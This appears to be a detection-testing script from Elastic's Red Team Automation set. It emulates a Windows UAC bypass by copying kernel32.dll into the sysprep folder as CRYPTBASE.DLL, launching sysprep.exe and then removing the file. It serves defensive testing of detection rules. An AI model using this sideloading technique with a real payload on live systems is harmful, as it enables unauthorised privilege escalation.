# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: Bypass UAC via Sysprep
# RTA: uac_sysprep.py
# ATT&CK: T1088
# Description: Use CRYPTBASE.dll opportunity to do Dll Sideloading with SysPrep for a UAC bypass


from . import _common


@register_code_rta(
    id="72e0a6ca-5b2d-48f6-9d6f-a879ace9cdae",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[],
    siem_rules=[],
    techniques=[],
)
def main():
    _common.log("Bypass UAC with CRYPTBASE.dll")

    _common.copy_file(
        "C:\\windows\\system32\\kernel32.dll",
        "C:\\Windows\\system32\sysprep\\CRYPTBASE.DLL",
    )
    _common.execute(["C:\\Windows\\system32\sysprep\\sysprep.exe"], timeout=5, kill=True)
    _common.remove_file("C:\\Windows\\system32\sysprep\\CRYPTBASE.DLL")


